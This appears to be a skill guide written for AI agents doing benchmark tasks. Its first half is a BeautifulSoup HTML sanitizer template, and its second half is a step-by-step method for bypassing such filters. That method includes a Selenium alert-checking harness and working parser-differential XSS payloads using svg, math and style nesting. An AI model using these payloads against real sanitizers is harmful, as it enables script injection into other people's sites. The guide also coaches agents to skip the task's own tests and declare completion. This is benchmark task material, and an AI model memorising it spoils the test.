# HTML Filter Analysis & Bypass Patterns

## Part 1: Surgical HTML Modification (for building sanitizers)

When a task requires modifying HTML (or XML) while preserving unchanged content byte-for-byte,
use the parse-identify-surgical-remove pattern:

## Table of Contents

- [Strategy](#strategy)
- [Why not use BeautifulSoup's output directly?](#why-not-use-beautifulsoups-output-directly)
- [Code Template](#code-template)
- [Key Principles](#key-principles)
- [Part 2: HTML Filter Bypass](#part-2-html-filter-bypass)

## Strategy

1. Read the original HTML as a string.
2. Parse with BeautifulSoup (html.parser) to IDENTIFY what to remove.
3. For each identified dangerous element/attribute, remove it from the ORIGINAL string
   by finding and replacing its exact text representation — NOT by using the parser's output.
4. Diff the result against the original for clean files to verify nothing unnecessary changed.

## Why not use BeautifulSoup's output directly?

BeautifulSoup reformats HTML: lowercases tag names, reorders attributes, adds closing tags,
changes whitespace. For tasks that say 'do not alter formatting', the parser's output will
fail even if the logical content is correct. Instead, use the parser as a DETECTOR and the
original string as the OUTPUT.

## Code Template

```python
import sys
import re
from bs4 import BeautifulSoup, Comment

def sanitize_html(original_html):
    """Remove dangerous content from HTML while preserving original formatting."""
    # Keep the original string — we will modify IT, not the parser's output
    result = original_html

    # Parse to IDENTIFY dangerous content
    soup = BeautifulSoup(original_html, 'html.parser')

    # --- Remove script tags and their content ---
    for script in soup.find_all('script'):
        # Get the exact string representation from the original
        # by encoding back to string and finding it
        tag_str = str(script)
        if tag_str in result:
            result = result.replace(tag_str, '')
        else:
            # Tag may have been reformatted by parser; use regex on original
            # Match the opening tag, content, and closing tag
            pattern = re.compile(
                r'<\s*script[^>]*>.*?<\s*/\s*script\s*>',
                re.IGNORECASE | re.DOTALL
            )
            result = pattern.sub('', result)

    # --- Remove event handler attributes (on*) ---
    # These are inherently dangerous regardless of context
    for tag in soup.find_all(True):
        for attr in list(tag.attrs.keys()):
            if attr.lower().startswith('on'):
                # Build pattern to match this attribute in the original string
                # Handles: onclick="...", onclick='...', onclick=..., ONCLICK=...
                attr_pattern = re.compile(
                    r'\s+' + re.escape(attr) + r'\s*=\s*(?:"[^"]*"|\'[^\']*\'|\S+)',
                    re.IGNORECASE
                )
                result = attr_pattern.sub('', result)

    # --- Remove javascript:/vbscript:/data: URLs from href/src/action etc. ---
    dangerous_url_attrs = {'href', 'src', 'action', 'formaction', 'background',
                           'dynsrc', 'lowsrc', 'data', 'cite', 'poster'}
    for tag in soup.find_all(True):
        for attr in list(tag.attrs.keys()):
            if attr.lower() in dangerous_url_attrs:
                val = tag.get(attr, '')
                if isinstance(val, list):
                    val = ' '.join(val)
                val_decoded = val.lower()
                if any(scheme in val_decoded for scheme in ['javascript:', 'vbscript:',
                                                            'data:text/html', 'data:application']):
                    attr_pattern = re.compile(
                        r'(\s+' + re.escape(attr) + r'\s*=\s*)(?:"[^"]*"|\'[^\']*\'|\S+)',
                        re.IGNORECASE
                    )
                    result = attr_pattern.sub(r'\1""', result)  # Replace URL with empty

    # --- Remove dangerous CSS in style attributes ---
    for tag in soup.find_all(True):
        style = tag.get('style', '')
        if style and any(kw in style.lower() for kw in
                         ['expression', '-moz-binding', 'javascript:', 'vbscript:']):
            attr_pattern = re.compile(
                r'(\s+style\s*=\s*)(?:"[^"]*"|\'[^\']*\')',
                re.IGNORECASE
            )
            result = attr_pattern.sub(r'\1""', result)  # Clear dangerous style

    return result


if __name__ == '__main__':
    filepath = sys.argv[1]
    with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
        html = f.read()
    html = sanitize_html(html)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(html)
```

## Key Principles

1. **NEVER use regex as the primary removal mechanism.** Regex is unaware of HTML
   structure and will corrupt attribute boundaries, leave dangling spaces, and remove
   entire tags when attributes are partially matched.

2. **NEVER output the parser's string.** BeautifulSoup reformats HTML — use it only
   as a detector to identify WHAT needs removal.

3. **Remove ONLY inherently dangerous content.** Do NOT blanket-remove element types
   (iframe, style, meta, object, embed) that can be benign. Only remove:
   - `<script>` tags and their content (always dangerous)
   - `on*` event handler attributes (always dangerous)
   - `javascript:`/`vbscript:`/`data:text/html` URLs in URL attributes (always dangerous)
   - CSS `expression()`/`-moz-binding`/`url(javascript:)` in style attributes (always dangerous)

4. **VERIFY with diff.** After filtering, compare clean HTML files before/after:
   ```bash
   cp original.html /tmp/orig.html && python3 filter.py original.html && diff /tmp/orig.html original.html
   ```
   Zero diff output = preservation succeeded. Any diff output = bug.

## Part 2: HTML Filter Bypass

When a task requires BYPASSING an HTML filter (XSS bypass, filter evasion,
crafting HTML that triggers JavaScript after sanitization), use this systematic
approach. Random trial-and-error of bypass techniques wastes dozens of turns
without convergence — you need to understand the filter AND the browser.

### Step 1: Read and understand the filter source

Identify EXACTLY what the filter removes:
- Which tags? (script, iframe, object, embed, style, etc.)
- Which attributes? (on*, src, href, style, etc.)
- How are URLs checked? (javascript:, data:, vbscript: schemes)
- What parser does it use? (html.parser, lxml, html5lib — each has different
  edge cases)
- What is the output method? (str(soup), original string with replacements, etc.)

Test each detection condition with a Python one-liner:
```python
python3 -c "from bs4 import BeautifulSoup; \
  s = BeautifulSoup('PAYLOAD', 'html.parser'); \
  print([t.attrs for t in s.find_all(True)])"
```

### Step 2: Know what does NOT work in modern Chrome/Chromium

Agents waste dozens of turns on these — they are all dead ends:
- **`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`**:
  Modern Chrome blocks javascript: URLs in meta refresh. The content survives
  the filter but the browser silently ignores it. Do NOT use this approach.
- **SVG `<set>`/`<animate>` with `attributeName="onload"`**: These set the
  DOM attribute VALUE as a string, but do NOT create an event handler. Setting
  `onload="alert(1)"` via animation adds a string attribute, not an executable
  handler. Chrome will NOT execute it.
- **`javascript:` URLs in `<a href>` or `<area href>`**: These require user
  interaction (click). No known auto-trigger mechanism works without on*
  attributes or script tags.
- **`<form action="javascript:alert(1)">` with `<button autofocus>`**:
  autofocus focuses the button but does NOT auto-submit the form.
- **CSS `expression()` or `-moz-binding`**: IE-only, dead in Chrome.
- **Fullwidth Unicode attributes (ｏｎerror)**: Chrome does not normalize
  fullwidth characters to ASCII — the attribute is treated as a non-event.
- **HTML entity encoding in attribute names (&#111;nerror)**: BeautifulSoup
  normalizes these before the filter checks them, AND Chrome does not decode
  entities in attribute names.
- **Zero-width spaces in attribute names**: The attribute still starts with
  'on' after the ZWS, or Chrome doesn't normalize it.

### Step 3: Parser differentials — the viable approach

If the filter uses BeautifulSoup's html.parser, it may handle edge cases
DIFFERENTLY than Chrome's HTML5 parser. The key insight: if BeautifulSoup
does NOT see an element/attribute (so the filter doesn't remove it), but
Chrome DOES see it after re-parsing the filter's output, the bypass works.

**Key property of `str(soup)` output**: BeautifulSoup serializes raw text
content (inside `<style>`, `<script>`, etc.) as-is. If an HTML snippet is
raw text in BeautifulSoup's parse tree but Chrome re-parses it as executable
HTML, the bypass succeeds.

**Testing methodology**:
1. Write a candidate payload where on* attributes are inside raw text elements
   so BeautifulSoup doesn't see them as tag attributes.
2. Run the payload through the filter and save the output:
   ```bash
   python3 -c "import shutil,sys; shutil.copy('/app/out.html','/tmp/f.html'); \
     sys.path.insert(0,'/app'); from filter import remove_js; \
     html=open('/tmp/f.html').read(); open('/tmp/f.html','w').write(remove_js(html))"
   ```
3. Write a Selenium test to /tmp and run it with `timeout` + output redirect:
   ```bash
   cat << 'PYEOF' > /tmp/test_bypass.py
   import subprocess, tempfile
   from pathlib import Path
   from selenium import webdriver
   from selenium.webdriver.chrome.options import Options
   from selenium.webdriver.chrome.service import Service
   from selenium.webdriver.support.ui import WebDriverWait
   from selenium.webdriver.support import expected_conditions as EC
   out_path = Path('/app/out.html')
   with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False) as f:
       f.write(out_path.read_text())
       filtered_path = Path(f.name)
   result = subprocess.run(['python3', '/app/filter.py', str(filtered_path)], capture_output=True, text=True)
   print(f'Filter exit code: {result.returncode}')
   opts = Options()
   opts.add_argument('--headless')
   opts.add_argument('--no-sandbox')
   opts.add_argument('--disable-dev-shm-usage')
   opts.add_argument('--disable-gpu')
   opts.binary_location = '/usr/bin/chromium'
   driver = webdriver.Chrome(service=Service('/usr/bin/chromedriver'), options=opts)
   try:
       driver.get(f'file://{filtered_path.absolute()}')
       WebDriverWait(driver, 5).until(EC.alert_is_present())
       alert = driver.switch_to.alert
       print(f'ALERT DETECTED: {alert.text}')
       alert.accept()
       print('BYPASS WORKS')
   except:
       print('No alert - bypass failed')
   finally:
       driver.quit()
       filtered_path.unlink(missing_ok=True)
   PYEOF
   timeout 30 python3 /tmp/test_bypass.py > /tmp/bypass_result.txt 2>&1 && cat /tmp/bypass_result.txt
   ```
4. Only declare success if the Selenium test prints 'BYPASS WORKS'.

**CRITICAL — Do NOT attempt to run test_outputs.py or /tests/ scripts during
your session.** The /tests/ directory is provided by the verifier at test
time and may not exist during your agent session (SKILL.md Procedure step 2).
Attempting to run test_outputs.py when /tests/filter.py doesn't exist causes
FileNotFoundError and empty output, leading to a polling spiral that wastes
30+ turns. Instead, verify your bypass ONLY with a custom Selenium test that
directly calls /app/filter.py (as shown above). Once your custom test prints
'BYPASS WORKS', the bypass is confirmed — call task_complete immediately.
Do NOT use `nohup ... &` + `sleep && cat` for Selenium tests — use
`timeout python3 script.py > /tmp/result.txt 2>&1 && cat /tmp/result.txt`
so the test runs in the foreground with output capture.

### Step 4: Known parser differential patterns

These patterns exploit differences between how html.parser and Chrome's
HTML5 parser handle specific HTML constructs:

1. **Foreign content + raw text elements** (HIGHEST PRIORITY — test this
   first): html.parser always treats `<style>` as a raw text element whose
   content is opaque text — it won't see HTML tags inside `<style>`. If
   a filter iterates only over parsed elements (`soup.find_all(True)`),
   attributes inside `<style>` are invisible. Chrome's HTML5 parser may
   handle `<style>` inside `<svg>` differently, allowing child elements
   to be parsed as real HTML with working event handlers. Test payloads
   (in order of simplicity):
   ```html
   <svg><style><img src=x onerror=alert(1)></style></svg>
   ```
   ```html
   <math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>
   ```
   These are the most commonly working variants because they exploit the
   simplest parser differential: html.parser treats `<img>` inside
   `<style>` as raw text (invisible to on* filtering), while Chrome exits
   foreign content on `<img>` and parses it as a real element.

2. **Comment-assisted escaping**: HTML comments inside raw text elements
   can create situations where one parser sees a closing tag and another
   doesn't. For example:
   ```html
   <svg><style><!--</style><img src=x onerror=alert(1)>--></svg>
   ```
   NOTE: this variant often FAILS because html.parser may treat `</style>`
   as closing the style tag (making img visible to the filter, which then
   removes onerror). Test Pattern 1 variants before this one.

3. **`<math>` + `<mtext>` + block elements**: In Chrome's HTML5 parser,
   encountering certain block-level elements (like `<table>`) inside
   `<math>` foreign content causes the parser to exit foreign content mode
   and resume HTML parsing. This can cause Chrome to see elements that
   html.parser (which doesn't implement foreign content exit) doesn't.

For each pattern, test BOTH halves: (1) Does the payload survive the
filter? (2) Does the filtered output trigger an alert in Chrome? Only both
true = a working bypass. Start with Pattern 1 — it has the highest
success rate against BeautifulSoup html.parser filters.